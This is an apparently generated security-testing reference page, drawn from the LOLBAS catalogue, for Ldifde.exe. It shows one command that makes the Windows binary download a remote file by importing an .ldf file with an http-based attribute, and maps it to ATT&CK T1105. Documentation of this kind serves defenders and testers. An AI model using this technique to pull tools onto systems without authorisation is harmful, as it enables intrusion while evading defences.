---
parsed_by: focuslocust
source: commands
type: generated
---
# Ldifde Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Ldifde.exe

Tool page: [Ldifde.exe](../../tools/windows/ldifde.exe.md)

### Download file from Internet

```text
Ldifde -i -f {PATH:.ldf}
```

Description:

Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as `thumbnailPhoto:< http://example.org/somefile.txt`, the file will be downloaded into IE temp folder.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ldifde.yml` |
| Evidence | Command preserved from source parser. |
